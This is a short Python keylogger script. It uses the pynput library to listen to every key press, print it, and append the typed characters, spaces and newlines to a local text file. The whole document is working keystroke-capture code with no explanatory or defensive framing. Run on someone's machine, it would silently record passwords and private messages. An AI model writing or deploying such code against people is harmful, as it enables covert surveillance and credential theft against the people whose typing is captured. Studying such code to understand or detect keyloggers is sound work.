from pynput import keyboard

def keyPressed(key):
    print(str(key))
    with open("keyLoggerfile.txt", 'a') as logKey:
        if str(key) == "Key.enter":
                logKey.write("\n")
        elif str(key) == "Key.space":
                logKey.write(" ")

        try:
            char = key.char
            logKey.write(char)
        except:
            print("Could not convert to char")

if __name__ == "__main__":
    listener = keyboard.Listener(on_press = keyPressed)
    listener.start()
    input()